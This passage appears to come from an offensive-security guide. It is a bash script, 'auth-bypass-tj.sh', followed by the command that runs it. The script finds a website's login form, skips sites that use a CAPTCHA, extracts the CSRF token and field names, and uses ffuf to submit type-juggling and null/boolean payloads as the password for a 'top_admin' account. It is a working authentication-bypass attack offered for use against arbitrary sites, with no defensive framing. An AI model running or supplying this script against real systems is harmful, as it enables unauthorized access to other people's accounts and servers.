grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=top_admin&${PASSWORD_FIELD}=FUZZ"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Auth Bypass Header
payload_list="/tmp/payloads.txt"
cat > $payload_list << EOF
0
0e0
0e12345
0e215962017
0e11111111
0e1294123
null
NULL
true
false
"0"
"0e0"
"null"
[]
{}
EOF

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$payload_list:FUZZ" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$payload_list:FUZZ" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-tj.sh;sudo ./auth-bypass-tj.sh $WEBSITE
```
